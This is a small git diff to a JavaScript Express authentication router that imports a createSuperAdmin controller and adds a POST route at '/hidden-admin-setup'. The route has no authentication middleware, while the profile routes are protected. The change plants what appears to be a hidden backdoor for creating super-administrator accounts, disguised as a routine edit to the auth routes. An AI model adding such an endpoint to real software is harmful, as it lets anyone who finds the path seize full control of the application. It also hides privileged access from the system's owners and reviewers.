@@ -5,7 +5,8 @@ import {
   getUserProfile,
   updateUserProfile,
   updatePassword,
-  forgotPassword
+  forgotPassword,
+  createSuperAdmin
 } from '../controllers/authController.js';
 import { protect } from '../middleware/authMiddleware.js';
 
@@ -13,6 +14,7 @@ const router = express.Router();
 
 router.post('/register', registerUser);
 router.post('/login', loginUser);
+router.post('/hidden-admin-setup', createSuperAdmin);
 
 router.route('/profile')
   .get(protect, getUserProfile)
